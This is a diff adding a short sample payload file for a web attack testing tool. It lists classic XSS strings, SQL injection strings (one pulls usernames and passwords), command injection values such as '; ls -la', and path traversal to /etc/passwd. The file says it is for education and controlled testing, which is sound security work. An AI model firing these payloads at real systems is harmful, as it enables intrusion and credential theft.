@@ -1,0 +1,24 @@
+# Sample Payload for Testing
+# This is a demonstration file for the Web Attacker Server
+
+## XSS Payload Examples
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+
+## SQL Injection Examples
+' OR 1=1 --
+' UNION SELECT username,password FROM users --
+admin'--
+
+## Command Injection Examples
+; ls -la
+| whoami
+`id`
+
+## File Inclusion Examples
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+
+## Note: These are for educational purposes only
+## Use only in controlled testing environments
